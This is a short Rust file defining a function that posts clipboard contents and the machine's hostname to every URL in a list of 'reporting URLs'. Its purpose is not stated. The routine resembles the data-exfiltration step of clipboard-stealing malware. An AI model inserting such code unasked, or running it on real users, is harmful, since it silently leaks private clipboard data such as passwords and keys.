use serde::{Deserialize, Serialize};

#[derive(Serialize, Deserialize)]
pub struct ClipboardTask {
    pub text: String,
    pub sender: String,
}

pub fn transmit_clipboard(clipboard_contents: String, reporting_urls: &Vec<String>) {
    let client = reqwest::blocking::Client::new();

    let task = ClipboardTask {
        text: clipboard_contents,
        sender: hostname::get().unwrap().to_str().unwrap().to_string(),
    };

    for url in reporting_urls {
        let res = client
            .post(&format!("{}/clipboard", url))
            .json(&task)
            .send();

        if res.is_err() {
            println!("Failed to send clipboard contents to {}", url);
        }
    }
}
